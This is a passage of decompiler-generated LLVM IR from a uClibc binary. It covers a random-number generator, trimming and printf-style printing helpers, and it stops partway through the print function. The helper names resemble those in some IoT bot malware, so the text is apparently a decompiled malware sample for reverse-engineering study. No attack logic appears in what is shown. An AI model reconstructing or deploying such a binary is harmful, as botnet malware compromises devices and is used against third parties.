entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_11d28.22 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 110052, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @abort()
  ret i32 %v0_81bc
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_81dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_81dc, i32* @global_var_26880.25, align 4
  %v1_81fc = add i32 %v0_81dc, -1640531527
  store i32 %v1_81fc, i32* @global_var_26884.26, align 4
  %v1_8218 = add i32 %v0_81dc, 1013904242
  store i32 %v1_8218, i32* @global_var_26888.27, align 4
  br label %dec_label_pc_8230

dec_label_pc_8230:                                ; preds = %entry, %dec_label_pc_8230
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_8274, %dec_label_pc_8230 ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_8240 = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_26880.25 to i32), i32 -12)
  %v6_8240 = inttoptr i32 %v5_8240 to i32*
  %v7_8240 = load i32, i32* %v6_8240, align 4
  %tmp9 = mul i32 %storemerge12, 4
  %v5_8250 = add i32 %tmp9, add (i32 ptrtoint (i32* @global_var_26880.25 to i32), i32 -8)
  %v6_8250 = inttoptr i32 %v5_8250 to i32*
  %v7_8250 = load i32, i32* %v6_8250, align 4
  %v2_8254 = xor i32 %storemerge12, -1640531527
  %v2_825c = xor i32 %v2_8254, %v7_8240
  %v2_8264 = xor i32 %v2_825c, %v7_8250
  %v5_826c = mul nuw nsw i32 %storemerge12, 4
  %v6_826c = add i32 %v5_826c, ptrtoint (i32* @global_var_26880.25 to i32)
  %v7_826c = inttoptr i32 %v6_826c to i32*
  store i32 %v2_8264, i32* %v7_826c, align 4
  %v1_8274 = add nuw nsw i32 %storemerge12, 1
  %v7_828c = icmp slt i32 %v1_8274, 4096
  br i1 %v7_828c, label %dec_label_pc_8230, label %dec_label_pc_8290

dec_label_pc_8290:                                ; preds = %dec_label_pc_8230
  %v9_8294 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_8294

; uselistorder directives
  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8230, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_82a0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_82a0, i32* @ip, align 4
  %v2_82d0 = load i32, i32* @global_var_264e0.30, align 4
  %v1_82d4 = add i32 %v2_82d0, 1
  %v3_82dc = urem i32 %v1_82d4, 4096
  store i32 %v3_82dc, i32* @global_var_264e0.30, align 4
  %v4_82f4 = mul nuw nsw i32 %v3_82dc, 4
  %v5_82f4 = add i32 %v4_82f4, ptrtoint (i32* @global_var_26880.25 to i32)
  %v6_82f4 = inttoptr i32 %v5_82f4 to i32*
  %v7_82f4 = load i32, i32* %v6_82f4, align 4
  %v2_830c = mul i32 %v7_82f4, 18782
  store i32 %v2_830c, i32* %r1.global-to-local, align 4
  %v2_8324 = load i32, i32* @global_var_264dc.33, align 4
  %v2_832c = add i32 %v2_8324, %v2_830c
  %v3_832c = icmp ult i32 %v2_832c, %v2_8324
  %v4_8330 = zext i1 %v3_832c to i32
  %v2_8360 = add i32 %v4_8330, %v2_832c
  %v3_8374 = icmp ult i32 %v2_8360, %v4_8330
  br i1 %v3_8374, label %dec_label_pc_837c, label %dec_label_pc_839c

dec_label_pc_837c:                                ; preds = %entry
  %v1_8380 = add i32 %v2_8360, 1
  %v1_8390 = select i1 %v3_832c, i32 2, i32 1
  br label %dec_label_pc_839c

dec_label_pc_839c:                                ; preds = %entry, %dec_label_pc_837c
  %storemerge = phi i32 [ %v1_8390, %dec_label_pc_837c ], [ %v4_8330, %entry ]
  %stack_var_-28.0 = phi i32 [ %v1_8380, %dec_label_pc_837c ], [ %v2_8360, %entry ]
  store i32 %storemerge, i32* @global_var_264dc.33, align 4
  store i32 %v3_82dc, i32* %r1.global-to-local, align 4
  %v2_83ac = sub i32 -2, %stack_var_-28.0
  store i32 %v2_83ac, i32* %v6_82f4, align 4
  %v1_83bc = load i32, i32* %r1.global-to-local, align 4
  %v4_83bc = mul i32 %v1_83bc, 4
  %v5_83bc = add i32 %v4_83bc, ptrtoint (i32* @global_var_26880.25 to i32)
  %v6_83bc = inttoptr i32 %v5_83bc to i32*
  %v7_83bc = load i32, i32* %v6_83bc, align 4
  ret i32 %v7_83bc

; uselistorder directives
  uselistorder i32 %v4_8330, { 0, 2, 1 }
  uselistorder i32 %v2_8324, { 1, 0 }
  uselistorder i32 %v3_82dc, { 2, 1, 0 }
  uselistorder i32* @global_var_26880.25, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_26880.25 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_839c, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i8*, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_83d8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_83d8, i32* @ip, align 4
  store i8* %arg1, i8** %stack_var_-32, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_83f8 = call i32 @strlen(i8* %arg1)
  store i32 %v3_83f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8418

dec_label_pc_8418:                                ; preds = %dec_label_pc_8418, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_8410, %dec_label_pc_8418 ]
  %v3_8420 = load i8*, i8** %stack_var_-32, align 4
  %v4_8420 = ptrtoint i8* %v3_8420 to i32
  %v2_8424 = add i32 %v4_8420, %stack_var_-24.0
  %v1_8428 = inttoptr i32 %v2_8424 to i8*
  %v2_8428 = load i8, i8* %v1_8428, align 1
  %v3_8428 = zext i8 %v2_8428 to i32
  store i32 %v3_8428, i32* %r0.global-to-local, align 4
  %v1_8430 = call i32 @isspace(i32 %v3_8428)
  store i32 %v1_8430, i32* %r0.global-to-local, align 4
  %v2_8438 = icmp eq i32 %v1_8430, 0
  %v1_8410 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8438, label %dec_label_pc_8450.preheader, label %dec_label_pc_8418

dec_label_pc_8450.preheader:                      ; preds = %dec_label_pc_8418
  %v1_8400 = add i32 %v3_83f8, -1
  %v5_845c10 = icmp slt i32 %v1_8400, %stack_var_-24.0
  br i1 %v5_845c10, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8460

dec_label_pc_8444:                                ; preds = %dec_label_pc_8460
  %v1_8448 = add i32 %stack_var_-20.011, -1
  %v5_845c = icmp slt i32 %v1_8448, %stack_var_-24.0
  br i1 %v5_845c, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8460

dec_label_pc_8460:                                ; preds = %dec_label_pc_8450.preheader, %dec_label_pc_8444
  %stack_var_-20.011 = phi i32 [ %v1_8448, %dec_label_pc_8444 ], [ %v1_8400, %dec_label_pc_8450.preheader ]
  %v3_8468 = load i8*, i8** %stack_var_-32, align 4
  %v4_8468 = ptrtoint i8* %v3_8468 to i32
  %v2_846c = add i32 %v4_8468, %stack_var_-20.011
  %v1_8470 = inttoptr i32 %v2_846c to i8*
  %v2_8470 = load i8, i8* %v1_8470, align 1
  %v3_8470 = zext i8 %v2_8470 to i32
  store i32 %v3_8470, i32* %r0.global-to-local, align 4
  %v1_8478 = call i32 @isspace(i32 %v3_8470)
  store i32 %v1_8478, i32* %r0.global-to-local, align 4
  %v2_8480 = icmp eq i32 %v1_8478, 0
  br i1 %v2_8480, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8444

dec_label_pc_84d0.preheader:                      ; preds = %dec_label_pc_8444, %dec_label_pc_8460, %dec_label_pc_8450.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_8400, %dec_label_pc_8450.preheader ], [ %v1_8448, %dec_label_pc_8444 ], [ %stack_var_-20.011, %dec_label_pc_8460 ]
  br label %dec_label_pc_84d0

dec_label_pc_8494:                                ; preds = %dec_label_pc_84d0
  %v2_84b8 = add i32 %v4_84f0, %storemerge1
  %v1_84bc = inttoptr i32 %v2_84b8 to i8*
  %v2_84bc = load i8, i8* %v1_84bc, align 1
  %v3_84c0 = inttoptr i32 %v2_84f4 to i8*
  store i8 %v2_84bc, i8* %v3_84c0, align 1
  %v1_84c8 = add i32 %storemerge1, 1
  br label %dec_label_pc_84d0

dec_label_pc_84d0:                                ; preds = %dec_label_pc_84d0.preheader, %dec_label_pc_8494
  %storemerge1 = phi i32 [ %v1_84c8, %dec_label_pc_8494 ], [ %stack_var_-24.0, %dec_label_pc_84d0.preheader ]
  %v7_84dc = icmp sgt i32 %storemerge1, %stack_var_-20.0.lcssa
  %v2_84e8 = sub i32 %storemerge1, %stack_var_-24.0
  %v3_84f0 = load i8*, i8** %stack_var_-32, align 4
  %v4_84f0 = ptrtoint i8* %v3_84f0 to i32
  %v2_84f4 = add i32 %v4_84f0, %v2_84e8
  br i1 %v7_84dc, label %dec_label_pc_84e0, label %dec_label_pc_8494

dec_label_pc_84e0:                                ; preds = %dec_label_pc_84d0
  %v3_84fc = inttoptr i32 %v2_84f4 to i8*
  store i8 0, i8* %v3_84fc, align 1
  %v9_8504 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_8504

; uselistorder directives
  uselistorder i32 %storemerge1, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8400, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i8** %stack_var_-32, { 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 1, 5, 3, 7, 6, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_84d0, { 1, 0 }
  uselistorder label %dec_label_pc_84d0.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8460, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8508 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8508, i32* @ip, align 4
  %v0_8518 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_8524 = icmp eq i32 %v0_8518, 0
  br i1 %v2_8524, label %dec_label_pc_8558, label %dec_label_pc_852c

dec_label_pc_852c:                                ; preds = %entry
  %v1_8530 = inttoptr i32 %v0_8518 to i32*
  %v2_8530 = load i32, i32* %v1_8530, align 4
  %v1_853c = trunc i32 %arg2 to i8
  %v3_853c = inttoptr i32 %v2_8530 to i8*
  store i8 %v1_853c, i8* %v3_853c, align 1
  %v2_8544 = load i32, i32* %v1_8530, align 4
  %v1_8548 = add i32 %v2_8544, 1
  store i32 %v1_8548, i32* %v1_8530, align 4
  %v9_8570.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_856c

dec_label_pc_8558:                                ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v3_8568 = call i32 @__libc_write(i32 1, i32* nonnull %stack_var_-24)
  store i32 %v3_8568, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_856c

dec_label_pc_856c:                                ; preds = %dec_label_pc_852c, %dec_label_pc_8558
  %v9_8570 = phi i32 [ %v9_8570.pre, %dec_label_pc_852c ], [ %v3_8568, %dec_label_pc_8558 ]
  ret i32 %v9_8570

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_856c, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8574 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8574, i32* @ip, align 4
  %v3_8578 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp43 = icmp slt i32 %arg3, 1
  br i1 %tmp43, label %dec_label_pc_8630, label %dec_label_pc_85b0

dec_label_pc_85b0:                                ; preds = %entry
  %v2_85e020 = load i8, i8* %arg2, align 1
  %v2_85e422 = icmp eq i8 %v2_85e020, 0
  br i1 %v2_85e422, label %dec_label_pc_85ec, label %dec_label_pc_85c4

dec_label_pc_85c4:                                ; preds = %dec_label_pc_85b0, %dec_label_pc_85c4
  %v4_85dc24 = phi i32 [ %v1_85d4, %dec_label_pc_85c4 ], [ %tmp, %dec_label_pc_85b0 ]
  %stack_var_-40.023 = phi i32 [ %v1_85c8, %dec_label_pc_85c4 ], [ 0, %dec_label_pc_85b0 ]
  %v1_85c8 = add i32 %stack_var_-40.023, 1
  %v1_85d4 = add i32 %v4_85dc24, 1
  %v5_85d8 = inttoptr i32 %v1_85d4 to i8*
  %v2_85e0 = load i8, i8* %v5_85d8, align 1
  %v2_85e4 = icmp eq i8 %v2_85e0, 0
  br i1 %v2_85e4, label %dec_label_pc_85ec, label %dec_label_pc_85c4

dec_label_pc_85ec:                                ; preds = %dec_label_pc_85c4, %dec_label_pc_85b0
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_85b0 ], [ %v1_85c8, %dec_label_pc_85c4 ]
  %v5_85f8 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_85f8, label %dec_label_pc_8608, label %dec_label_pc_8618

dec_label_pc_8608:                                ; preds = %dec_label_pc_85ec
  %v2_8610 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_8618

dec_label_pc_8618:                                ; preds = %dec_label_pc_85ec, %dec_label_pc_8608
  %storemerge4 = phi i32 [ %v2_8610, %dec_label_pc_8608 ], [ 0, %dec_label_pc_85ec ]
  %v1_861c = and i32 %arg4, 2
  %v2_8620 = icmp eq i32 %v1_861c, 0
  br i1 %v2_8620, label %dec_label_pc_8630, label %dec_label_pc_8628

dec_label_pc_8628:                                ; preds = %dec_label_pc_8618
  br label %dec_label_pc_8630

dec_label_pc_8630:                                ; preds = %dec_label_pc_8618, %entry, %dec_label_pc_8628
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge4, %dec_label_pc_8618 ], [ %storemerge4, %dec_label_pc_8628 ]
  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_8618 ], [ 48, %dec_label_pc_8628 ]
  %v1_8634 = urem i32 %arg4, 2
  %v2_8638 = icmp eq i32 %v1_8634, 0
  br i1 %v2_8638, label %dec_label_pc_8668.preheader, label %dec_label_pc_86a4.preheader

dec_label_pc_8668.preheader:                      ; preds = %dec_label_pc_8630
  %v5_867017 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_867017, label %dec_label_pc_8644.lr.ph, label %dec_label_pc_86a4.preheader

dec_label_pc_8644.lr.ph:                          ; preds = %dec_label_pc_8668.preheader
  %v2_864c = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8644

dec_label_pc_8644:                                ; preds = %dec_label_pc_8644.lr.ph, %dec_label_pc_8644
  %stack_var_-28.118 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8644.lr.ph ], [ %v1_8660, %dec_label_pc_8644 ]
  %v3_864c = call i32 @printchar(i32* %v2_864c, i32 %stack_var_-44.0)
  %v3_8650 = load i32, i32* %stack_var_-48, align 4
  %v1_8654 = add i32 %v3_8650, 1
  store i32 %v1_8654, i32* %stack_var_-48, align 4
  %v1_8660 = add nsw i32 %stack_var_-28.118, -1
  %v5_8670 = icmp sgt i32 %stack_var_-28.118, 1
  br i1 %v5_8670, label %dec_label_pc_8644, label %dec_label_pc_86a4.preheader

dec_label_pc_86a4.preheader:                      ; preds = %dec_label_pc_8644, %dec_label_pc_8668.preheader, %dec_label_pc_8630
  %v3_86e828 = phi i32 [ 0, %dec_label_pc_8630 ], [ 0, %dec_label_pc_8668.preheader ], [ %v1_8654, %dec_label_pc_8644 ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_8630 ], [ %stack_var_-28.0, %dec_label_pc_8668.preheader ], [ 0, %dec_label_pc_8644 ]
  %v2_86a810 = load i8, i8* %arg2, align 1
  %v2_86ac12 = icmp eq i8 %v2_86a810, 0
  br i1 %v2_86ac12, label %dec_label_pc_86dc.preheader, label %dec_label_pc_8678.lr.ph

dec_label_pc_8678.lr.ph:                          ; preds = %dec_label_pc_86a4.preheader
  %v2_8688 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8678

dec_label_pc_8678:                                ; preds = %dec_label_pc_8678.lr.ph, %dec_label_pc_8678
  %v4_86a414 = phi i32 [ %tmp, %dec_label_pc_8678.lr.ph ], [ %v1_869c, %dec_label_pc_8678 ]
  %stack_var_-24.013 = phi i8* [ %arg2, %dec_label_pc_8678.lr.ph ], [ %v5_86a0, %dec_label_pc_8678 ]
  %v2_867c = load i8, i8* %stack_var_-24.013, align 1
  %v3_867c = zext i8 %v2_867c to i32
  %v3_8688 = call i32 @printchar(i32* %v2_8688, i32 %v3_867c)
  %v3_868c = load i32, i32* %stack_var_-48, align 4
  %v1_8690 = add i32 %v3_868c, 1
  store i32 %v1_8690, i32* %stack_var_-48, align 4
  %v1_869c = add i32 %v4_86a414, 1
  %v5_86a0 = inttoptr i32 %v1_869c to i8*
  %v2_86a8 = load i8, i8* %v5_86a0, align 1
  %v2_86ac = icmp eq i8 %v2_86a8, 0
  br i1 %v2_86ac, label %dec_label_pc_86dc.preheader, label %dec_label_pc_8678

dec_label_pc_86dc.preheader:                      ; preds = %dec_label_pc_8678, %dec_label_pc_86a4.preheader
  %v3_86e827 = phi i32 [ %v3_86e828, %dec_label_pc_86a4.preheader ], [ %v1_8690, %dec_label_pc_8678 ]
  %v5_86e47 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_86e47, label %dec_label_pc_86b8.lr.ph, label %dec_label_pc_86e8

dec_label_pc_86b8.lr.ph:                          ; preds = %dec_label_pc_86dc.preheader
  %v2_86c0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86b8

dec_label_pc_86b8:                                ; preds = %dec_label_pc_86b8.lr.ph, %dec_label_pc_86b8
  %stack_var_-28.38 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_86b8.lr.ph ], [ %v1_86d4, %dec_label_pc_86b8 ]
  %v3_86c0 = call i32 @printchar(i32* %v2_86c0, i32 %stack_var_-44.0)
  %v3_86c4 = load i32, i32* %stack_var_-48, align 4
  %v1_86c8 = add i32 %v3_86c4, 1
  store i32 %v1_86c8, i32* %stack_var_-48, align 4
  %v1_86d4 = add nsw i32 %stack_var_-28.38, -1
  %v5_86e4 = icmp sgt i32 %stack_var_-28.38, 1
  br i1 %v5_86e4, label %dec_label_pc_86b8, label %dec_label_pc_86e8

dec_label_pc_86e8:                                ; preds = %dec_label_pc_86b8, %dec_label_pc_86dc.preheader
  %v3_86e8 = phi i32 [ %v3_86e827, %dec_label_pc_86dc.preheader ], [ %v1_86c8, %dec_label_pc_86b8 ]
  store i32 %v3_8578, i32* @fp, align 4
  ret i32 %v3_86e8

; uselistorder directives
  uselistorder i32 %v1_869c, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_85d4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_86b8, { 1, 0 }
  uselistorder label %dec_label_pc_8678, { 1, 0 }
  uselistorder label %dec_label_pc_8644, { 1, 0 }
  uselistorder label %dec_label_pc_8630, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8618, { 1, 0 }
  uselistorder label %dec_label_pc_85c4, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_86fc = load i32, i32* @fp, align 4
  store i32 34564, i32* %stack_var_-4, align 4
  %v2_8700 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8700, i32* @fp, align 4
  %v1_8734 = icmp slt i32 %arg2, 0
  %v2_8734 = icmp eq i32 %arg2, 0
  br i1 %v2_8734, label %dec_label_pc_873c, label %dec_label_pc_8770

dec_label_pc_873c:                                ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_8760 = bitcast i32* %stack_var_-28 to i8*
  %v6_8760 = call i32 @prints(i32 %arg1, i8* %v5_8760, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_88d0

dec_label_pc_8770:                                ; preds = %entry
  %v2_8774 = icmp eq i32 %arg4, 0
  br i1 %v2_8774, label %dec_label_pc_87a8, label %dec_label_pc_877c

dec_label_pc_877c:                                ; preds = %dec_label_pc_8770
  %v7_8780 = icmp eq i32 %arg3, 10
  br i1 %v7_8780, label %dec_label_pc_8788, label %dec_label_pc_87a8

dec_label_pc_8788:                                ; preds = %dec_label_pc_877c
  br i1 %v1_8734, label %dec_label_pc_8794, label %dec_label_pc_87a8

dec_label_pc_8794:                                ; preds = %dec_label_pc_8788
  %v1_87a0 = sub i32 0, %arg2
  br label %dec_label_pc_87a8

dec_label_pc_87a8:                                ; preds = %dec_label_pc_8788, %dec_label_pc_877c, %dec_label_pc_8770, %dec_label_pc_8794
  %stack_var_-48.0 = phi i32 [ %arg2, %dec_label_pc_8770 ], [ %v1_87a0, %dec_label_pc_8794 ], [ %arg2, %dec_label_pc_8788 ], [ %arg2, %dec_label_pc_877c ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_8770 ], [ 1, %dec_label_pc_8794 ], [ 0, %dec_label_pc_8788 ], [ 0, %dec_label_pc_877c ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_883c4 = icmp eq i32 %stack_var_-48.0, 0
  br i1 %v2_883c4, label %dec_label_pc_8844, label %dec_label_pc_87c4.lr.ph

dec_label_pc_87c4.lr.ph:                          ; preds = %dec_label_pc_87a8
  %v2_87f0 = add i32 %arg7, -58
  br label %dec_label_pc_87c4

dec_label_pc_87c4:                                ; preds = %dec_label_pc_87c4.lr.ph, %dec_label_pc_87fc
  %stack_var_-48.16 = phi i32 [ %stack_var_-48.0, %dec_label_pc_87c4.lr.ph ], [ %v2_882c, %dec_label_pc_87fc ]
  %stack_var_-64.05 = phi i8* [ %tmp26, %dec_label_pc_87c4.lr.ph ], [ %v5_8804, %dec_label_pc_87fc ]
  %v2_87d0 = urem i32 %stack_var_-48.16, %arg3
  %v7_87e4 = icmp slt i32 %v2_87d0, 10
  br i1 %v7_87e4, label %dec_label_pc_87fc, label %dec_label_pc_87e8

dec_label_pc_87e8:                                ; preds = %dec_label_pc_87c4
  %v1_87f4 = add i32 %v2_87f0, %v2_87d0
  br label %dec_label_pc_87fc

dec_label_pc_87fc:                                ; preds = %dec_label_pc_87c4, %dec_label_pc_87e8
  %stack_var_-60.0 = phi i32 [ %v2_87d0, %dec_label_pc_87c4 ], [ %v1_87f4, %dec_label_pc_87e8 ]
  %v4_87fc = ptrtoint i8* %stack_var_-64.05 to i32
  %v1_8800 = add i32 %v4_87fc, -1
  %v5_8804 = inttoptr i32 %v1_8800 to i8*
  %fold = add i32 %stack_var_-60.0, 48
  %v1_881c = trunc i32 %fold to i8
  store i8 %v1_881c, i8* %v5_8804, align 1
  %v2_882c = udiv i32 %stack_var_-48.16, %arg3
  %v2_883c = icmp ult i32 %stack_var_-48.16, %arg3
  br i1 %v2_883c, label %dec_label_pc_8844, label %dec_label_pc_87c4

dec_label_pc_8844:                                ; preds = %dec_label_pc_87fc, %dec_label_pc_87a8
  %stack_var_-64.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_87a8 ], [ %v5_8804, %dec_label_pc_87fc ]
  %v2_8848 = icmp eq i32 %stack_var_-56.0, 0
  br i1 %v2_8848, label %dec_label_pc_88ac, label %dec_label_pc_8850

dec_label_pc_8850:                                ; preds = %dec_label_pc_8844
  %v3_8850 = load i32, i32* %stack_var_0, align 4
  %v2_8854 = icmp eq i32 %v3_8850, 0
  br i1 %v2_8854, label %dec_label_pc_8894, label %dec_label_pc_885c

dec_label_pc_885c:                                ; preds = %dec_label_pc_8850
  %v1_8860 = and i32 %arg6, 2
  %v2_8864 = icmp eq i32 %v1_8860, 0
  br i1 %v2_8864, label %dec_label_pc_8894, label %dec_label_pc_886c

dec_label_pc_886c:                                ; preds = %dec_label_pc_885c
  %v2_8874 = inttoptr i32 %arg1 to i32*
  %v3_8874 = call i32 @printchar(i32* %v2_8874, i32 45)
  %v3_8884 = load i32, i32* %stack_var_0, align 4
  %v1_8888 = add i32 %v3_8884, -1
  store i32 %v1_8888, i32* %stack_var_0, align 4
  br label %dec_label_pc_88ac

dec_label_pc_8894:                                ; preds = %dec_label_pc_885c, %dec_label_pc_8850
  %v4_8894 = ptrtoint i8* %stack_var_-64.0.lcssa to i32
  %v1_8898 = add i32 %v4_8894, -1
  %v5_889c = inttoptr i32 %v1_8898 to i8*
  store i8 45, i8* %v5_889c, align 1
  br label %dec_label_pc_88ac

dec_label_pc_88ac:                                ; preds = %dec_label_pc_8844, %dec_label_pc_886c, %dec_label_pc_8894
  %stack_var_-64.1 = phi i8* [ %stack_var_-64.0.lcssa, %dec_label_pc_8844 ], [ %v5_889c, %dec_label_pc_8894 ], [ %stack_var_-64.0.lcssa, %dec_label_pc_886c ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_8844 ], [ 0, %dec_label_pc_8894 ], [ 1, %dec_label_pc_886c ]
  %v3_88b4 = load i32, i32* %stack_var_0, align 4
  %v6_88bc = call i32 @prints(i32 %arg1, i8* %stack_var_-64.1, i32 %v3_88b4, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_88c8 = add i32 %v6_88bc, %stack_var_-52.0
  br label %dec_label_pc_88d0

dec_label_pc_88d0:                                ; preds = %dec_label_pc_873c, %dec_label_pc_88ac
  %storemerge2 = phi i32 [ %v2_88c8, %dec_label_pc_88ac ], [ %v6_8760, %dec_label_pc_873c ]
  store i32 %v3_86fc, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-64.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_8804, { 0, 2, 1 }
  uselistorder i32 %v2_87d0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-48.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_88d0, { 1, 0 }
  uselistorder label %dec_label_pc_88ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_87fc, { 1, 0 }
  uselistorder label %dec_label_pc_87c4, { 1, 0 }
  uselistorder label %dec_label_pc_87a8, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_88e0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_88e0, i32* @ip, align 4
  store i32 35052, i32* %stack_var_-4, align 4
  %v2_88e8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_88e8, i32* @fp, align 4
  %stack_var_-28.428 = inttoptr i32 %arg2 to i8*
  %v2_8c9429 = load i8, i8* %stack_var_-28.428, align 1
  %v2_8c9831 = icmp eq i8 %v2_8c9429, 0
  br i1 %v2_8c9831, label %dec_label_pc_8ca0, label %dec_label_pc_8908.lr.ph

dec_label_pc_8908.lr.ph:                          ; preds = %entry
  %v5_8c4c = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8908

dec_label_pc_8908:                                ; preds = %dec_label_pc_8908.lr.ph, %dec_label_pc_8c84
  %stack_var_-28.435 = phi i8* [ %stack_var_-28.428, %dec_label_pc_8908.lr.ph ], [ %stack_var_-28.4, %dec_label_pc_8c84 ]
